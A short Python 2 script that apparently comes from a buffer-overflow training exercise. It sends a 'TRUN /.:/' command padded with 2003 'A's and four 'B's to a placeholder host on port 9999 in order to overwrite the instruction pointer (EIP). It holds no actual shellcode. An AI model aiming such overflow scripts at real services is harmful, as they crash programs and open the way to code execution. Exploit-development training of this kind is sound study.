#!/usr/bin/python2
import sys, socket


shellcode = "A" * 2003 + "B" * 4

try:
    print "\nOverwriting EIP..."
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("x.x.x.x", 9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()

except:            
    print "\nError Connecting to Server"
    sys.exit()
